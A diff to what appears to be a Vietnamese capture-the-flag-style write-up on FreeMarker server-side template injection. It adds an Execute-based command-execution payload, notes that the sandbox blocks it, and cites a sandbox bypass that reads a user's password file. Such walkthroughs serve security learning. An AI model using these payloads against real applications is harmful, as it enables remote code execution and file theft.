@@ -8,7 +8,15 @@ Tiến hành fuzz với các kí tự đặc biệt, object không tồn tại t
 
 Test thử các loại syntax có thể áp dụng thì ta thấy được `Default: ${3*3} Legacy: #{3*3}`, là 2 template dùng được.
 
-giờ sẽ có 2 cách, **cách 1** là ở hội nghị defcon có trình bày, link tôi để phía dưới, 
+```
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+```
+
+![image](https://github.com/user-attachments/assets/8b6b42b6-dcca-4b01-b0ea-36d2a2bac8e8)
+
+Sau khi thử payload trên của freemarker để rce thì nó lại ném lỗi ra cho chúng ta là chỉ được edit trong môi trường sandbox, tức là nó đã detect đc payload của chúng ta, sau khi lên mạng tìm hiểu cách bypass sandbox của freemarker thì:
+
+Giờ sẽ có 2 cách, **cách 1** là ở hội nghị defcon có trình bày, link tôi để phía dưới, 
 
 ```
 ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
